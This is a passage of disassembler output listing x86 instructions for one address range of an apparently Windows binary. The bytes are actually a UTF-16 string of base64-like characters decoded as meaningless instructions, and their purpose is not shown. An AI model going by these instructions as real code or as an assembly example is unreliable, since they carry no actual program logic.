  404144:	00 66 00             	add    %ah,0x0(%esi)
  404147:	37                   	aaa
  404148:	00 73 00             	add    %dh,0x0(%ebx)
  40414b:	76 00                	jbe    0x40414d
  40414d:	76 00                	jbe    0x40414f
  40414f:	2b 00                	sub    (%eax),%eax
  404151:	37                   	aaa
  404152:	00 46 00             	add    %al,0x0(%esi)
  404155:	59                   	pop    %ecx
  404156:	00 2b                	add    %ch,(%ebx)
  404158:	00 55 00             	add    %dl,0x0(%ebp)
  40415b:	79 00                	jns    0x40415d
  40415d:	77 00                	ja     0x40415f
  40415f:	62 00                	bound  %eax,(%eax)
  404161:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  404164:	00 58 00             	add    %bl,0x0(%eax)
  404167:	46                   	inc    %esi
  404168:	00 35 00 71 00 67    	add    %dh,0x67007100
  40416e:	00 6a 00             	add    %ch,0x0(%edx)
  404171:	45                   	inc    %ebp
  404172:	00 59 00             	add    %bl,0x0(%ecx)
  404175:	62 00                	bound  %eax,(%eax)
  404177:	55                   	push   %ebp
  404178:	00 58 00             	add    %bl,0x0(%eax)
  40417b:	39 00                	cmp    %eax,(%eax)
  40417d:	61                   	popa
  40417e:	00 6b 00             	add    %ch,0x0(%ebx)
  404181:	76 00                	jbe    0x404183
  404183:	48                   	dec    %eax
  404184:	00 74 00 38          	add    %dh,0x38(%eax,%eax,1)
  404188:	00 47 00             	add    %al,0x0(%edi)
  40418b:	54                   	push   %esp
  40418c:	00 49 00             	add    %cl,0x0(%ecx)
  40418f:	78 00                	js     0x404191
  404191:	55                   	push   %ebp
  404192:	00 6a 00             	add    %ch,0x0(%edx)
  404195:	36 00 6c 00 6f       	add    %ch,%ss:0x6f(%eax,%eax,1)
  40419a:	00 70 00             	add    %dh,0x0(%eax)
  40419d:	61                   	popa
  40419e:	00 50 00             	add    %dl,0x0(%eax)
  4041a1:	42                   	inc    %edx
  4041a2:	00 37                	add    %dh,(%edi)
  4041a4:	00 36                	add    %dh,(%esi)
  4041a6:	00 2f                	add    %ch,(%edi)
  4041a8:	00 34 00             	add    %dh,(%eax,%eax,1)
  4041ab:	4a                   	dec    %edx
  4041ac:	00 73 00             	add    %dh,0x0(%ebx)
  4041af:	44                   	inc    %esp
  4041b0:	00 63 00             	add    %ah,0x0(%ebx)
  4041b3:	54                   	push   %esp
  4041b4:	00 61 00             	add    %ah,0x0(%ecx)
  4041b7:	50                   	push   %eax
  4041b8:	00 2f                	add    %ch,(%edi)
  4041ba:	00 6e 00             	add    %ch,0x0(%esi)
  4041bd:	2f                   	das
  4041be:	00 54 00 77          	add    %dl,0x77(%eax,%eax,1)
  4041c2:	00 53 00             	add    %dl,0x0(%ebx)
  4041c5:	58                   	pop    %eax
  4041c6:	00 2f                	add    %ch,(%edi)
  4041c8:	00 35 00 35 00 73    	add    %dh,0x73003500
  4041ce:	00 30                	add    %dh,(%eax)
  4041d0:	00 32                	add    %dh,(%edx)
  4041d2:	00 73 00             	add    %dh,0x0(%ebx)
  4041d5:	69 00 6a 00 32 00    	imul   $0x32006a,(%eax),%eax
  4041db:	63 00                	arpl   %eax,(%eax)
  4041dd:	71 00                	jno    0x4041df
  4041df:	74 00                	je     0x4041e1
  4041e1:	47                   	inc    %edi
  4041e2:	00 46 00             	add    %al,0x0(%esi)
  4041e5:	75 00                	jne    0x4041e7
  4041e7:	58                   	pop    %eax
  4041e8:	00 6a 00             	add    %ch,0x0(%edx)
  4041eb:	6d                   	insl   (%dx),%es:(%edi)
  4041ec:	00 62 00             	add    %ah,0x0(%edx)
  4041ef:	79 00                	jns    0x4041f1
  4041f1:	2b 00                	sub    (%eax),%eax
  4041f3:	4b                   	dec    %ebx
  4041f4:	00 4d 00             	add    %cl,0x0(%ebp)
  4041f7:	59                   	pop    %ecx
  4041f8:	00 7a 00             	add    %bh,0x0(%edx)
  4041fb:	78 00                	js     0x4041fd
  4041fd:	6a 00                	push   $0x0
  4041ff:	79 00                	jns    0x404201
  404201:	68 00 66 00 36       	push   $0x36006600
  404206:	00 71 00             	add    %dh,0x0(%ecx)
  404209:	31 00                	xor    %eax,(%eax)
  40420b:	62 00                	bound  %eax,(%eax)
  40420d:	54                   	push   %esp
  40420e:	00 68 00             	add    %ch,0x0(%eax)
  404211:	72 00                	jb     0x404213
  404213:	38 00                	cmp    %al,(%eax)
  404215:	58                   	pop    %eax
  404216:	00 5a 00             	add    %bl,0x0(%edx)
  404219:	58                   	pop    %eax
  40421a:	00 62 00             	add    %ah,0x0(%edx)
  40421d:	6a 00                	push   $0x0
  40421f:	77 00                	ja     0x404221
  404221:	4f                   	dec    %edi
  404222:	00 45 00             	add    %al,0x0(%ebp)
  404225:	78 00                	js     0x404227
  404227:	59                   	pop    %ecx
  404228:	00 48 00             	add    %cl,0x0(%eax)
  40422b:	77 00                	ja     0x40422d
  40422d:	2f                   	das
  40422e:	00 55 00             	add    %dl,0x0(%ebp)
  404231:	54                   	push   %esp
  404232:	00 65 00             	add    %ah,0x0(%ebp)
  404235:	65 00 30             	add    %dh,%gs:(%eax)
  404238:	00 77 00             	add    %dh,0x0(%edi)
  40423b:	43                   	inc    %ebx
  40423c:	00 55 00             	add    %dl,0x0(%ebp)
  40423f:	4b                   	dec    %ebx
  404240:	00 7a 00             	add    %bh,0x0(%edx)
  404243:	34 00                	xor    $0x0,%al
  404245:	67 00 65 00          	add    %ah,0x0(%di)
  404249:	75 00                	jne    0x40424b
  40424b:	54                   	push   %esp
  40424c:	00 58 00             	add    %bl,0x0(%eax)
  40424f:	63 00                	arpl   %eax,(%eax)
  404251:	32 00                	xor    (%eax),%al
  404253:	77 00                	ja     0x404255
  404255:	70 00                	jo     0x404257
  404257:	4c                   	dec    %esp
  404258:	00 47 00             	add    %al,0x0(%edi)
  40425b:	41                   	inc    %ecx
  40425c:	00 43 00             	add    %al,0x0(%ebx)
  40425f:	32 00                	xor    (%eax),%al
  404261:	53                   	push   %ebx
  404262:	00 70 00             	add    %dh,0x0(%eax)
  404265:	66 00 42 00          	data16 add %al,0x0(%edx)
  404269:	79 00                	jns    0x40426b
  40426b:	59                   	pop    %ecx
  40426c:	00 61 00             	add    %ah,0x0(%ecx)
  40426f:	6d                   	insl   (%dx),%es:(%edi)
  404270:	00 31                	add    %dh,(%ecx)
  404272:	00 55 00             	add    %dl,0x0(%ebp)
  404275:	74 00                	je     0x404277
  404277:	32 00                	xor    (%eax),%al
  404279:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  40427d:	73 00                	jae    0x40427f
  40427f:	49                   	dec    %ecx
  404280:	00 30                	add    %dh,(%eax)
  404282:	00 77 00             	add    %dh,0x0(%edi)
  404285:	71 00                	jno    0x404287
  404287:	66 00 64 00 36       	data16 add %ah,0x36(%eax,%eax,1)
  40428c:	00 5a 00             	add    %bl,0x0(%edx)
  40428f:	72 00                	jb     0x404291
  404291:	52                   	push   %edx
  404292:	00 37                	add    %dh,(%edi)
  404294:	00 71 00             	add    %dh,0x0(%ecx)
  404297:	6f                   	outsl  %ds:(%esi),(%dx)
  404298:	00 36                	add    %dh,(%esi)
  40429a:	00 4e 00             	add    %cl,0x0(%esi)
  40429d:	33 00                	xor    (%eax),%eax
  40429f:	39 00                	cmp    %eax,(%eax)
  4042a1:	4f                   	dec    %edi
  4042a2:	00 47 00             	add    %al,0x0(%edi)
  4042a5:	63 00                	arpl   %eax,(%eax)
  4042a7:	46                   	inc    %esi
  4042a8:	00 45 00             	add    %al,0x0(%ebp)
  4042ab:	74 00                	je     0x4042ad
  4042ad:	58                   	pop    %eax
  4042ae:	00 4d 00             	add    %cl,0x0(%ebp)
  4042b1:	61                   	popa
  4042b2:	00 50 00             	add    %dl,0x0(%eax)
  4042b5:	31 00                	xor    %eax,(%eax)
  4042b7:	6b 00 73             	imul   $0x73,(%eax),%eax
  4042ba:	00 4c 00 49          	add    %cl,0x49(%eax,%eax,1)
  4042be:	00 72 00             	add    %dh,0x0(%edx)
  4042c1:	38 00                	cmp    %al,(%eax)
  4042c3:	34 00                	xor    $0x0,%al
  4042c5:	34 00                	xor    $0x0,%al
  4042c7:	30 00                	xor    %al,(%eax)
  4042c9:	32 00                	xor    (%eax),%al
  4042cb:	48                   	dec    %eax
  4042cc:	00 64 00 35          	add    %ah,0x35(%eax,%eax,1)
  4042d0:	00 42 00             	add    %al,0x0(%edx)
  4042d3:	38 00                	cmp    %al,(%eax)
  4042d5:	4a                   	dec    %edx
  4042d6:	00 47 00             	add    %al,0x0(%edi)
  4042d9:	52                   	push   %edx
  4042da:	00 7a 00             	add    %bh,0x0(%edx)
  4042dd:	6d                   	insl   (%dx),%es:(%edi)
  4042de:	00 62 00             	add    %ah,0x0(%edx)
  4042e1:	4d                   	dec    %ebp
  4042e2:	00 36                	add    %dh,(%esi)
  4042e4:	00 46 00             	add    %al,0x0(%esi)
  4042e7:	6b 00 62             	imul   $0x62,(%eax),%eax
  4042ea:	00 6f 00             	add    %ch,0x0(%edi)
  4042ed:	50                   	push   %eax
  4042ee:	00 41 00             	add    %al,0x0(%ecx)
  4042f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4042f2:	00 6a 00             	add    %ch,0x0(%edx)
  4042f5:	34 00                	xor    $0x0,%al
  4042f7:	48                   	dec    %eax
  4042f8:	00 74 00 44          	add    %dh,0x44(%eax,%eax,1)
  4042fc:	00 5a 00             	add    %bl,0x0(%edx)
  4042ff:	68 00 71 00 35       	push   $0x35007100
  404304:	00 44 00 6a          	add    %al,0x6a(%eax,%eax,1)
  404308:	00 37                	add    %dh,(%edi)
  40430a:	00 4b 00             	add    %cl,0x0(%ebx)
  40430d:	71 00                	jno    0x40430f
  40430f:	6b 00 57             	imul   $0x57,(%eax),%eax
  404312:	00 34 00             	add    %dh,(%eax,%eax,1)
  404315:	77 00                	ja     0x404317
  404317:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40431b:	69 00 66 00 4f 00    	imul   $0x4f0066,(%eax),%eax
  404321:	61                   	popa
  404322:	00 57 00             	add    %dl,0x0(%edi)
  404325:	37                   	aaa
  404326:	00 56 00             	add    %dl,0x0(%esi)
  404329:	7a 00                	jp     0x40432b
  40432b:	30 00                	xor    %al,(%eax)
  40432d:	74 00                	je     0x40432f
  40432f:	52                   	push   %edx
  404330:	00 6a 00             	add    %ch,0x0(%edx)
  404333:	48                   	dec    %eax
  404334:	00 50 00             	add    %dl,0x0(%eax)
  404337:	45                   	inc    %ebp
  404338:	00 35 00 48 00 31    	add    %dh,0x31004800
  40433e:	00 34 00             	add    %dh,(%eax,%eax,1)
  404341:	6b 00 43             	imul   $0x43,(%eax),%eax
  404344:	00 54 00 39          	add    %dl,0x39(%eax,%eax,1)
  404348:	00 5a 00             	add    %bl,0x0(%edx)
  40434b:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  40434e:	00 55 00             	add    %dl,0x0(%ebp)
  404351:	31 00                	xor    %eax,(%eax)
  404353:	73 00                	jae    0x404355
  404355:	4c                   	dec    %esp
  404356:	00 69 00             	add    %ch,0x0(%ecx)
  404359:	79 00                	jns    0x40435b
  40435b:	34 00                	xor    $0x0,%al
  40435d:	49                   	dec    %ecx
  40435e:	00 61 00             	add    %ah,0x0(%ecx)
  404361:	57                   	push   %edi
  404362:	00 2b                	add    %ch,(%ebx)
  404364:	00 7a 00             	add    %bh,0x0(%edx)
  404367:	2b 00                	sub    (%eax),%eax
  404369:	43                   	inc    %ebx
  40436a:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
  40436e:	00 32                	add    %dh,(%edx)
  404370:	00 77 00             	add    %dh,0x0(%edi)
  404373:	47                   	inc    %edi
  404374:	00 36                	add    %dh,(%esi)
  404376:	00 77 00             	add    %dh,0x0(%edi)
  404379:	74 00                	je     0x40437b
  40437b:	52                   	push   %edx
  40437c:	00 36                	add    %dh,(%esi)
  40437e:	00 4d 00             	add    %cl,0x0(%ebp)
  404381:	34 00                	xor    $0x0,%al
  404383:	70 00                	jo     0x404385
  404385:	56                   	push   %esi
  404386:	00 6f 00             	add    %ch,0x0(%edi)
  404389:	4c                   	dec    %esp
  40438a:	00 68 00             	add    %ch,0x0(%eax)
  40438d:	37                   	aaa
  40438e:	00 33                	add    %dh,(%ebx)
  404390:	00 53 00             	add    %dl,0x0(%ebx)
  404393:	45                   	inc    %ebp
  404394:	00 57 00             	add    %dl,0x0(%edi)
  404397:	42                   	inc    %edx
  404398:	00 36                	add    %dh,(%esi)
  40439a:	00 71 00             	add    %dh,0x0(%ecx)
  40439d:	52                   	push   %edx
  40439e:	00 46 00             	add    %al,0x0(%esi)
  4043a1:	41                   	inc    %ecx
  4043a2:	00 6a 00             	add    %ch,0x0(%edx)
  4043a5:	70 00                	jo     0x4043a7
  4043a7:	44                   	inc    %esp
  4043a8:	00 72 00             	add    %dh,0x0(%edx)
  4043ab:	78 00                	js     0x4043ad
  4043ad:	37                   	aaa
  4043ae:	00 59 00             	add    %bl,0x0(%ecx)
  4043b1:	76 00                	jbe    0x4043b3
  4043b3:	6d                   	insl   (%dx),%es:(%edi)
  4043b4:	00 44 00 4c          	add    %al,0x4c(%eax,%eax,1)
  4043b8:	00 55 00             	add    %dl,0x0(%ebp)
  4043bb:	57                   	push   %edi
  4043bc:	00 64 00 67          	add    %ah,0x67(%eax,%eax,1)
  4043c0:	00 6f 00             	add    %ch,0x0(%edi)
  4043c3:	62 00                	bound  %eax,(%eax)
  4043c5:	46                   	inc    %esi
  4043c6:	00 69 00             	add    %ch,0x0(%ecx)
  4043c9:	33 00                	xor    (%eax),%eax
  4043cb:	33 00                	xor    (%eax),%eax
  4043cd:	78 00                	js     0x4043cf
  4043cf:	64 00 32             	add    %dh,%fs:(%edx)
  4043d2:	00 43 00             	add    %al,0x0(%ebx)
  4043d5:	32 00                	xor    (%eax),%al
  4043d7:	5a                   	pop    %edx
  4043d8:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
  4043dc:	00 50 00             	add    %dl,0x0(%eax)
  4043df:	4d                   	dec    %ebp
  4043e0:	00 2b                	add    %ch,(%ebx)
  4043e2:	00 51 00             	add    %dl,0x0(%ecx)
  4043e5:	41                   	inc    %ecx
  4043e6:	00 49 00             	add    %cl,0x0(%ecx)
  4043e9:	68 00 74 00 6f       	push   $0x6f007400
  4043ee:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  4043f2:	00 49 00             	add    %cl,0x0(%ecx)
  4043f5:	2f                   	das
  4043f6:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
  4043fa:	00 6e 00             	add    %ch,0x0(%esi)
  4043fd:	2b 00                	sub    (%eax),%eax
  4043ff:	68 00 46 00 5a       	push   $0x5a004600
  404404:	00 4d 00             	add    %cl,0x0(%ebp)
  404407:	44                   	inc    %esp
  404408:	00 4b 00             	add    %cl,0x0(%ebx)
  40440b:	71 00                	jno    0x40440d
  40440d:	36 00 4a 00          	add    %cl,%ss:0x0(%edx)
  404411:	44                   	inc    %esp
  404412:	00 2f                	add    %ch,(%edi)
  404414:	00 36                	add    %dh,(%esi)
  404416:	00 38                	add    %bh,(%eax)
  404418:	00 30                	add    %dh,(%eax)
  40441a:	00 49 00             	add    %cl,0x0(%ecx)
  40441d:	38 00                	cmp    %al,(%eax)
  40441f:	57                   	push   %edi
  404420:	00 49 00             	add    %cl,0x0(%ecx)
  404423:	41                   	inc    %ecx
  404424:	00 71 00             	add    %dh,0x0(%ecx)
  404427:	52                   	push   %edx
  404428:	00 31                	add    %dh,(%ecx)
  40442a:	00 70 00             	add    %dh,0x0(%eax)
  40442d:	5a                   	pop    %edx
  40442e:	00 46 00             	add    %al,0x0(%esi)
  404431:	48                   	dec    %eax
  404432:	00 4d 00             	add    %cl,0x0(%ebp)
  404435:	66 00 30             	data16 add %dh,(%eax)
  404438:	00 31                	add    %dh,(%ecx)
  40443a:	00 38                	add    %bh,(%eax)
  40443c:	00 64 00 44          	add    %ah,0x44(%eax,%eax,1)
  404440:	00 73 00             	add    %dh,0x0(%ebx)
  404443:	7a 00                	jp     0x404445
  404445:	34 00                	xor    $0x0,%al
  404447:	4c                   	dec    %esp
  404448:	00 77 00             	add    %dh,0x0(%edi)
  40444b:	36 00 58 00          	add    %bl,%ss:0x0(%eax)
  40444f:	6c                   	insb   (%dx),%es:(%edi)
  404450:	00 7a 00             	add    %bh,0x0(%edx)
  404453:	79 00                	jns    0x404455
  404455:	77 00                	ja     0x404457
  404457:	39 00                	cmp    %eax,(%eax)
  404459:	36 00 57 00          	add    %dl,%ss:0x0(%edi)
  40445d:	62 00                	bound  %eax,(%eax)
  40445f:	44                   	inc    %esp
  404460:	00 67 00             	add    %ah,0x0(%edi)
  404463:	6f                   	outsl  %ds:(%esi),(%dx)
  404464:	00 4d 00             	add    %cl,0x0(%ebp)
  404467:	70 00                	jo     0x404469
  404469:	58                   	pop    %eax
  40446a:	00 31                	add    %dh,(%ecx)
  40446c:	00 6f 00             	add    %ch,0x0(%edi)
  40446f:	53                   	push   %ebx
  404470:	00 63 00             	add    %ah,0x0(%ebx)
  404473:	44                   	inc    %esp
  404474:	00 56 00             	add    %dl,0x0(%esi)
  404477:	70 00                	jo     0x404479
  404479:	56                   	push   %esi
  40447a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40447d:	44                   	inc    %esp
  40447e:	00 37                	add    %dh,(%edi)
  404480:	00 68 00             	add    %ch,0x0(%eax)
  404483:	77 00                	ja     0x404485
  404485:	4a                   	dec    %edx
  404486:	00 73 00             	add    %dh,0x0(%ebx)
  404489:	53                   	push   %ebx
  40448a:	00 76 00             	add    %dh,0x0(%esi)
  40448d:	4a                   	dec    %edx
  40448e:	00 34 00             	add    %dh,(%eax,%eax,1)
  404491:	68 00 38 00 58       	push   $0x58003800
  404496:	00 39                	add    %bh,(%ecx)
  404498:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
  40449c:	00 6b 00             	add    %ch,0x0(%ebx)
  40449f:	35 00 58 00 52       	xor    $0x52005800,%eax
  4044a4:	00 49 00             	add    %cl,0x0(%ecx)
  4044a7:	44                   	inc    %esp
  4044a8:	00 39                	add    %bh,(%ecx)
  4044aa:	00 2b                	add    %ch,(%ebx)
  4044ac:	00 4d 00             	add    %cl,0x0(%ebp)
  4044af:	77 00                	ja     0x4044b1
  4044b1:	61                   	popa
  4044b2:	00 6a 00             	add    %ch,0x0(%edx)
  4044b5:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  4044b9:	59                   	pop    %ecx
  4044ba:	00 41 00             	add    %al,0x0(%ecx)
  4044bd:	2f                   	das
  4044be:	00 72 00             	add    %dh,0x0(%edx)
  4044c1:	5a                   	pop    %edx
  4044c2:	00 4a 00             	add    %cl,0x0(%edx)
  4044c5:	6c                   	insb   (%dx),%es:(%edi)
  4044c6:	00 4e 00             	add    %cl,0x0(%esi)
  4044c9:	47                   	inc    %edi
  4044ca:	00 71 00             	add    %dh,0x0(%ecx)
  4044cd:	68 00 75 00 30       	push   $0x30007500
  4044d2:	00 7a 00             	add    %bh,0x0(%edx)
  4044d5:	36 00 52 00          	add    %dl,%ss:0x0(%edx)
  4044d9:	77 00                	ja     0x4044db
  4044db:	75 00                	jne    0x4044dd
  4044dd:	75 00                	jne    0x4044df
  4044df:	65 00 35 00 4b 00 37 	add    %dh,%gs:0x37004b00
  4044e6:	00 6c 00 53          	add    %ch,0x53(%eax,%eax,1)
  4044ea:	00 71 00             	add    %dh,0x0(%ecx)
  4044ed:	4d                   	dec    %ebp
  4044ee:	00 53 00             	add    %dl,0x0(%ebx)
  4044f1:	79 00                	jns    0x4044f3
  4044f3:	63 00                	arpl   %eax,(%eax)
  4044f5:	59                   	pop    %ecx
  4044f6:	00 6f 00             	add    %ch,0x0(%edi)
  4044f9:	64 00 4f 00          	add    %cl,%fs:0x0(%edi)
  4044fd:	63 00                	arpl   %eax,(%eax)
  4044ff:	42                   	inc    %edx
  404500:	00 69 00             	add    %ch,0x0(%ecx)
  404503:	53                   	push   %ebx
  404504:	00 4e 00             	add    %cl,0x0(%esi)
  404507:	38 00                	cmp    %al,(%eax)
  404509:	6c                   	insb   (%dx),%es:(%edi)
  40450a:	00 4f 00             	add    %cl,0x0(%edi)
  40450d:	76 00                	jbe    0x40450f
  40450f:	79 00                	jns    0x404511
  404511:	32 00                	xor    (%eax),%al
  404513:	45                   	inc    %ebp
  404514:	00 42 00             	add    %al,0x0(%edx)
  404517:	70 00                	jo     0x404519
  404519:	54                   	push   %esp
  40451a:	00 70 00             	add    %dh,0x0(%eax)
  40451d:	5a                   	pop    %edx
  40451e:	00 63 00             	add    %ah,0x0(%ebx)
  404521:	4d                   	dec    %ebp
  404522:	00 68 00             	add    %ch,0x0(%eax)
  404525:	31 00                	xor    %eax,(%eax)
  404527:	4a                   	dec    %edx
  404528:	00 57 00             	add    %dl,0x0(%edi)
  40452b:	32 00                	xor    (%eax),%al
  40452d:	6d                   	insl   (%dx),%es:(%edi)
  40452e:	00 68 00             	add    %ch,0x0(%eax)
  404531:	2b 00                	sub    (%eax),%eax
  404533:	78 00                	js     0x404535
  404535:	4c                   	dec    %esp
  404536:	00 35 00 79 00 39    	add    %dh,0x39007900
  40453c:	00 38                	add    %bh,(%eax)
  40453e:	00 47 00             	add    %al,0x0(%edi)
  404541:	73 00                	jae    0x404543
  404543:	69 00 51 00 6b 00    	imul   $0x6b0051,(%eax),%eax
  404549:	61                   	popa
  40454a:	00 41 00             	add    %al,0x0(%ecx)
  40454d:	54                   	push   %esp
  40454e:	00 59 00             	add    %bl,0x0(%ecx)
  404551:	41                   	inc    %ecx
  404552:	00 76 00             	add    %dh,0x0(%esi)
  404555:	6b 00 4a             	imul   $0x4a,(%eax),%eax
  404558:	00 56 00             	add    %dl,0x0(%esi)
  40455b:	4b                   	dec    %ebx
  40455c:	00 30                	add    %dh,(%eax)
  40455e:	00 4a 00             	add    %cl,0x0(%edx)
  404561:	55                   	push   %ebp
  404562:	00 6f 00             	add    %ch,0x0(%edi)
  404565:	2b 00                	sub    (%eax),%eax
  404567:	2f                   	das
  404568:	00 7a 00             	add    %bh,0x0(%edx)
  40456b:	55                   	push   %ebp
  40456c:	00 63 00             	add    %ah,0x0(%ebx)
  40456f:	74 00                	je     0x404571
  404571:	44                   	inc    %esp
  404572:	00 4a 00             	add    %cl,0x0(%edx)
  404575:	6c                   	insb   (%dx),%es:(%edi)
  404576:	00 4f 00             	add    %cl,0x0(%edi)
  404579:	57                   	push   %edi
  40457a:	00 64 00 62          	add    %ah,0x62(%eax,%eax,1)
  40457e:	00 75 00             	add    %dh,0x0(%ebp)
  404581:	57                   	push   %edi
  404582:	00 35 00 59 00 68    	add    %dh,0x68005900
  404588:	00 65 00             	add    %ah,0x0(%ebp)
  40458b:	43                   	inc    %ebx
  40458c:	00 58 00             	add    %bl,0x0(%eax)
  40458f:	48                   	dec    %eax
  404590:	00 4f 00             	add    %cl,0x0(%edi)
  404593:	70 00                	jo     0x404595
  404595:	4b                   	dec    %ebx
  404596:	00 7a 00             	add    %bh,0x0(%edx)
  404599:	33 00                	xor    (%eax),%eax
  40459b:	48                   	dec    %eax
  40459c:	00 65 00             	add    %ah,0x0(%ebp)
  40459f:	79 00                	jns    0x4045a1
  4045a1:	57                   	push   %edi
  4045a2:	00 2b                	add    %ch,(%ebx)
  4045a4:	00 6f 00             	add    %ch,0x0(%edi)
  4045a7:	46                   	inc    %esi
  4045a8:	00 66 00             	add    %ah,0x0(%esi)
  4045ab:	61                   	popa
  4045ac:	00 73 00             	add    %dh,0x0(%ebx)
  4045af:	35 00 51 00 2b       	xor    $0x2b005100,%eax
  4045b4:	00 55 00             	add    %dl,0x0(%ebp)
  4045b7:	61                   	popa
  4045b8:	00 53 00             	add    %dl,0x0(%ebx)
  4045bb:	36 00 71 00          	add    %dh,%ss:0x0(%ecx)
  4045bf:	64 00 6c 00 4a       	add    %ch,%fs:0x4a(%eax,%eax,1)
  4045c4:	00 2b                	add    %ch,(%ebx)
  4045c6:	00 4b 00             	add    %cl,0x0(%ebx)
  4045c9:	36 00 68 00          	add    %ch,%ss:0x0(%eax)
  4045cd:	69 00 33 00 75 00    	imul   $0x750033,(%eax),%eax
  4045d3:	4c                   	dec    %esp
  4045d4:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
  4045d8:	00 55 00             	add    %dl,0x0(%ebp)
  4045db:	56                   	push   %esi
  4045dc:	00 68 00             	add    %ch,0x0(%eax)
  4045df:	32 00                	xor    (%eax),%al
  4045e1:	72 00                	jb     0x4045e3
  4045e3:	50                   	push   %eax
  4045e4:	00 36                	add    %dh,(%esi)
  4045e6:	00 71 00             	add    %dh,0x0(%ecx)
  4045e9:	30 00                	xor    %al,(%eax)
  4045eb:	48                   	dec    %eax
  4045ec:	00 59 00             	add    %bl,0x0(%ecx)
  4045ef:	37                   	aaa
  4045f0:	00 59 00             	add    %bl,0x0(%ecx)
  4045f3:	30 00                	xor    %al,(%eax)
  4045f5:	48                   	dec    %eax
  4045f6:	00 43 00             	add    %al,0x0(%ebx)
  4045f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4045fa:	00 78 00             	add    %bh,0x0(%eax)
  4045fd:	74 00                	je     0x4045ff
  4045ff:	6b 00 51             	imul   $0x51,(%eax),%eax
  404602:	00 36                	add    %dh,(%esi)
  404604:	00 51 00             	add    %dl,0x0(%ecx)
  404607:	31 00                	xor    %eax,(%eax)
  404609:	47                   	inc    %edi
  40460a:	00 6a 00             	add    %ch,0x0(%edx)
  40460d:	33 00                	xor    (%eax),%eax
  40460f:	78 00                	js     0x404611
  404611:	4e                   	dec    %esi
  404612:	00 42 00             	add    %al,0x0(%edx)
  404615:	46                   	inc    %esi
  404616:	00 33                	add    %dh,(%ebx)
  404618:	00 68 00             	add    %ch,0x0(%eax)
  40461b:	5a                   	pop    %edx
  40461c:	00 43 00             	add    %al,0x0(%ebx)
  40461f:	51                   	push   %ecx
  404620:	00 6a 00             	add    %ch,0x0(%edx)
  404623:	44                   	inc    %esp
  404624:	00 56 00             	add    %dl,0x0(%esi)
  404627:	33 00                	xor    (%eax),%eax
  404629:	42                   	inc    %edx
  40462a:	00 39                	add    %bh,(%ecx)
  40462c:	00 58 00             	add    %bl,0x0(%eax)
  40462f:	30 00                	xor    %al,(%eax)
  404631:	42                   	inc    %edx
  404632:	00 4e 00             	add    %cl,0x0(%esi)
  404635:	32 00                	xor    (%eax),%al
  404637:	75 00                	jne    0x404639
  404639:	4f                   	dec    %edi
  40463a:	00 36                	add    %dh,(%esi)
  40463c:	00 45 00             	add    %al,0x0(%ebp)
  40463f:	51                   	push   %ecx
  404640:	00 2b                	add    %ch,(%ebx)
  404642:	00 69 00             	add    %ch,0x0(%ecx)
  404645:	31 00                	xor    %eax,(%eax)
  404647:	54                   	push   %esp
  404648:	00 52 00             	add    %dl,0x0(%edx)
  40464b:	31 00                	xor    %eax,(%eax)
  40464d:	6e                   	outsb  %ds:(%esi),(%dx)
  40464e:	00 74 00 2b          	add    %dh,0x2b(%eax,%eax,1)
  404652:	00 6e 00             	add    %ch,0x0(%esi)
  404655:	67 00 5a 00          	add    %bl,0x0(%bp,%si)
  404659:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
  40465d:	37                   	aaa
  40465e:	00 66 00             	add    %ah,0x0(%esi)
  404661:	6e                   	outsb  %ds:(%esi),(%dx)
  404662:	00 70 00             	add    %dh,0x0(%eax)
  404665:	49                   	dec    %ecx
  404666:	00 52 00             	add    %dl,0x0(%edx)
  404669:	6f                   	outsl  %ds:(%esi),(%dx)
  40466a:	00 43 00             	add    %al,0x0(%ebx)
  40466d:	62 00                	bound  %eax,(%eax)
  40466f:	4d                   	dec    %ebp
  404670:	00 38                	add    %bh,(%eax)
  404672:	00 56 00             	add    %dl,0x0(%esi)
  404675:	59                   	pop    %ecx
  404676:	00 39                	add    %bh,(%ecx)
  404678:	00 41 00             	add    %al,0x0(%ecx)
  40467b:	39 00                	cmp    %eax,(%eax)
  40467d:	4c                   	dec    %esp
  40467e:	00 69 00             	add    %ch,0x0(%ecx)
  404681:	72 00                	jb     0x404683
  404683:	36 00 36             	add    %dh,%ss:(%esi)
  404686:	00 2b                	add    %ch,(%ebx)
  404688:	00 39                	add    %bh,(%ecx)
  40468a:	00 4b 00             	add    %cl,0x0(%ebx)
  40468d:	7a 00                	jp     0x40468f
  40468f:	70 00                	jo     0x404691
  404691:	34 00                	xor    $0x0,%al
  404693:	55                   	push   %ebp
  404694:	00 52 00             	add    %dl,0x0(%edx)
  404697:	50                   	push   %eax
  404698:	00 75 00             	add    %dh,0x0(%ebp)
  40469b:	30 00                	xor    %al,(%eax)
  40469d:	30 00                	xor    %al,(%eax)
  40469f:	59                   	pop    %ecx
  4046a0:	00 39                	add    %bh,(%ecx)
  4046a2:	00 56 00             	add    %dl,0x0(%esi)
  4046a5:	2f                   	das
  4046a6:	00 61 00             	add    %ah,0x0(%ecx)
  4046a9:	63 00                	arpl   %eax,(%eax)
  4046ab:	70 00                	jo     0x4046ad
  4046ad:	79 00                	jns    0x4046af
  4046af:	4a                   	dec    %edx
  4046b0:	00 5a 00             	add    %bl,0x0(%edx)
  4046b3:	4d                   	dec    %ebp
  4046b4:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  4046b8:	00 77 00             	add    %dh,0x0(%edi)
  4046bb:	78 00                	js     0x4046bd
  4046bd:	4b                   	dec    %ebx
  4046be:	00 75 00             	add    %dh,0x0(%ebp)
  4046c1:	78 00                	js     0x4046c3
  4046c3:	42                   	inc    %edx
  4046c4:	00 68 00             	add    %ch,0x0(%eax)
  4046c7:	67 00 43 00          	add    %al,0x0(%bp,%di)
  4046cb:	36 00 73 00          	add    %dh,%ss:0x0(%ebx)
